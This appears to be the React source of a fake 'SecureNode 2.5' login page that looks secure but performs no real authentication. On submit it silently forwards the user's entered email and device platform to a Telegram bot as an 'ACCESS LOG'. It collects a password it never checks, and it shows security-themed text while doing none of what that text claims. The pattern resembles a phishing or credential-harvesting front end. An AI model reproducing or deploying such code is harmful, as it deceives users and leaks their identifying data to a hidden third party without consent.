
import React, { useState, useEffect } from 'react';
import { getSecurityInsight } from '../services/geminiService';
import { sendBotMessage } from '../services/telegramService';

interface LoginFormProps {
  onLogin: (email: string) => void;
}

const LoginForm: React.FC<LoginFormProps> = ({ onLogin }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [insight, setInsight] = useState('Initializing terminal protocols...');

  useEffect(() => {
    const loadInsight = async () => {
      const text = await getSecurityInsight("User connecting via secure APK wrapper on " + navigator.platform);
      setInsight(text);
    };
    loadInsight();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    await sendBotMessage(`🔐 *ACCESS LOG*\nEmail: \`${email}\`\nHardware: ${navigator.platform}\nStatus: PENDING SETUP`);
    setTimeout(() => {
      setLoading(false);
      onLogin(email);
    }, 1500);
  };

  return (
    <div className="w-full max-w-md glass p-10 rounded-[2.5rem] shadow-2xl border border-slate-800 animate-in fade-in duration-700">
      <div className="mb-10 text-center">
        <div className="inline-flex items-center justify-center w-20 h-20 bg-blue-600 rounded-[1.5rem] mb-6 shadow-2xl shadow-blue-900/40 border-t border-white/20">
          <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A10.003 10.003 0 0014 3a10.003 10.003 0 00-11.212 15.01l.053.09a10.003 10.003 0 011.666 4.34l.01.063M16 11a4 4 0 11-8 0 4 4 0 018 0z" />
          </svg>
        </div>
        <h1 className="text-3xl font-black bg-gradient-to-br from-white via-white to-slate-500 bg-clip-text text-transparent italic uppercase tracking-tighter">
          SecureNode 2.5
        </h1>
        <div className="flex items-center justify-center gap-2 mt-2">
           <span className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" />
           <p className="text-slate-500 text-[10px] font-bold uppercase tracking-[0.3em]">Encrypted Uplink Active</p>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div>
          <label className="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Credential ID</label>
          <input
            type="email"
            required
            className="w-full px-5 py-4 bg-slate-900/80 border border-slate-800 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none text-slate-100 transition-all font-mono text-sm"
            placeholder="ACCESS_ID_09"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
        </div>
        <div>
          <label className="block text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2 ml-1">Security Hash</label>
          <input
            type="password"
            required
            className="w-full px-5 py-4 bg-slate-900/80 border border-slate-800 rounded-2xl focus:ring-2 focus:ring-blue-500 outline-none text-slate-100 transition-all font-mono text-sm"
            placeholder="••••••••"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
        </div>

        <button
          type="submit"
          disabled={loading}
          className="w-full py-5 bg-blue-600 hover:bg-blue-500 text-white font-black rounded-2xl transition-all shadow-xl shadow-blue-900/40 active:scale-[0.97] disabled:opacity-50 tracking-[0.2em] uppercase text-xs"
        >
          {loading ? (
            <div className="w-5 h-5 border-2 border-white/20 border-t-white rounded-full animate-spin mx-auto" />
          ) : 'INITIALIZE SESSION'}
        </button>
      </form>

      <div className="mt-10 p-5 bg-slate-900/50 rounded-2xl border border-slate-800/50">
        <p className="text-[10px] font-bold text-slate-600 uppercase tracking-widest mb-2">Network Insight</p>
        <p className="text-xs text-slate-400 italic leading-relaxed">"{insight}"</p>
      </div>
    </div>
  );
};

export default LoginForm;
